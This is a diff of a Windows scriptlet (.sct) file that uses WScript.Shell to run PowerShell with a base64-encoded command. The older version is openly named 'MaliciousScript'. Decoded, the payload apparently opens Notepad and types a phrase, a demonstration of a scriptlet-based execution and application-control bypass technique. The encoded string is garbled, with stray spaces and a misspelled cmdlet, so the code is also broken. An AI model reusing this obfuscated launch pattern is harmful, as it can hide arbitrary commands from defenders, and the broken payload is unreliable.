@@ -1,7 +1,10 @@
 <?XML version="1.0"?>
 <scriptlet>
-  <registration progid="MaliciousScript" classid="{A1112221-AAAA-1234-5678-000000000000}" />
+  <registration
+    progid="ShoTyGolova.Scriptlet"
+    classid="{AAAA1111-BBBB-2222-CCCC-333333333333}" />
   <script language="JScript">
-    new ActiveXObject("WScript.Shell").Exec("powershell -eC <base64_encoded_command>");
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Exec("powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQAOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA1ADAAMAA7ACAARQBkAGQALQBUAHkAcABlACAA LQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwA7ACAAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAXQA6ADoAUwBlAG4AZAA XwBXAGEAaQB0ACgAJwBzAGgAbwAgAHQAeQAgAGcAbwBsAG8AdgBhACcAKQA=");
   </script>
 </scriptlet>
